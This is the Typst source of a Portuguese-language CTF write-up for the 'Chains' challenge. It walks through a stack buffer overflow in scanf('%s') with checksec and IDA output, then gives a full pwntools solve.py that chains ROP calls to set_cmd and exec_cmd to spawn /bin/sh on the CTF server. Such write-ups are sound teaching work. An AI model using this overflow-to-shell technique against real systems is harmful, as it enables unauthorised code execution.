#import "styles/config.typ": setup_all

// ---------- Declare IDA variables here ----------
// So it colours them as well
#let local_vars = (
	"canary",
	"result",
	"argv",
)
#let global_vars = (
	"offset",
	"cmd",
)

// ---------- Define chall details here ----------
// For chall info, zsh and pwndbg
#let user = "dleskow"
#let host = "ganesh"
#let ctf = "Ping"
#let chall = "Chains"
#let path = "/home/" + host + "/" + ctf + "/" + context document.title
// raw_size fixes the size of every code block, cant be overwritten, as long as I know
#show: setup_all.with(user, host, path, local_vars: local_vars, global_vars: global_vars, raw_size: 7pt)

// ---------- Document start ----------
#set document(title: chall)
#title[Write-up: #context document.title]
#align(right)[por #emph(user)]
= Informações do chall
#grid(
	columns: 2,
	align(left)[
		- *Título*:
			#ctf/#chall
		- *Autor*:
			Ganesher Ancestrais
		- *Contexto*:
			Estava tão simples, mas eles quebraram o terminal ao meio! \
			O que faremos agora!?
	],
	align(left)[
		- *Arquivos*:
			- #emph(chall) (ELF)
	]
)

#set heading(numbering: "1.")
  
= Write-Up <write-up>
== Vulnerabilidade
	Começamos vendo o checksec do executável e abrindo-o no IDA:
	```pwndbg
	pwndbg> checksec
	File:     /home/Chains/chains
	Arch:     amd64
	RELRO:      Partial RELRO
	Stack:      No canary found
	NX:         NX enabled
	PIE:        No PIE (0x400000)
	Stripped:   No
	```
	Note que o PIE está desligado.

	```ida
	int __fastcall main(int argc, const char **argv, const char **envp)
	{
	_BYTE v4[16]; // [rsp+0h] [rbp-10h] BYREF
	
	setvbuf(_bss_start, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
	printf("> ");
	__isoc23_scanf("%s", v4);
	puts("Byebye\n");
	return 0;
	```
	Primeira coisa que podemos notar é o `scanf(%s)`, ou seja, sem limitar o limite máximo de carateres. Imediatamente, portanto, imagina-se buffer overflow.
    
	Agora vejamos as funções que possuímos, para ver se existe algo conveniente. Achamos duas funções:

	- *exec\_cmd:*

	```ida
	int exec_cmd()
	{
	  char *argv; // [rsp+8h] [rbp-8h] BYREF
	
	  argv = 0;
	  return execve(cmd, &argv, 0);
	}
	```
	Que, basicamente, executa a string `cmd` como uma função no terminal. Veja que `cmd` é uma variável global, pois só as variáveis globais possuem seus nomes guardados no ELF; basta clicar nela para ver sua posição na memória.

#pagebreak(weak: true) // Weak = if already on a new page, dont create another
	- *set\_cmd:*

	```ida
	__int64 set_cmd()
	{
	  __int64 result; // rax
	
	  result = 0x68732F6E69622FLL;
	  strcpy(cmd, "/bin/sh");
	  return result;
	}
	```
	Que coloca a string `/bin/sh` na variável `cmd`.

	Temos, portanto, o seguinte plano de ação:

	- Buffer Overflow;

	- Chamar set\_cmd();

	- Chamar exec\_cmd().

=== Ataque utilizando _pwntools_
	Para obter seus endereços, e abusando do PIE desligado, podemos simplesmente utilizar a função interna à classe ELF (do _pwntools_) _.sym_, que busca um símbolo (nome de variável, de função etc) e nos retorna seu offset.

	O ataque será assim, portanto. Primeiro obtemos os endereços:
	
	```python
	exe = ELF("./chains")
	p = process([exe.path])
	addr1 = exe.sym['set_cmd']
	addr2 = exe.sym['exec_cmd']
	```

	Então, fazemos o ROP com o buffer overflow
	
	```python
	payload = b''
	payload += 0x18 * b'a' # Tamanho do buffer+8 (sobrescrever rbp antigo)
	payload += p64(addr1)
	payload += p64(addr2)
	addr2 = exe.sym['exec_cmd']
	```

	Basta, agora, enviar tudo e esperar a shell =D

	```python
	p.sendline(payload)
	```
= solve.py <sec:solve>
	```python
	from pwn import *
	
	exe = ELF("../chains")
	
	REMOTE = False
	REMOTE = True
	
	print(exe.path)
	
	if REMOTE:
	    context.bits = 64
	    p = remote('ganesh.icmc.usp.br', 1114)
	    # p = remote('localhost', 1114)
	else:
	    context.binary = exe
	    p = process([exe.path])
	    gdb.attach(p, exe=exe.path, gdbscript="continue")
	
	# context.log_level = 'debug'
	
	addr1 = exe.sym['set_cmd']
	addr2 = exe.sym['exec_cmd']
	
	payload = 0x18 * b'd'
	payload += p64(addr1)
	payload += p64(addr2)
	p.sendline(payload)
	
	p.interactive()
	```
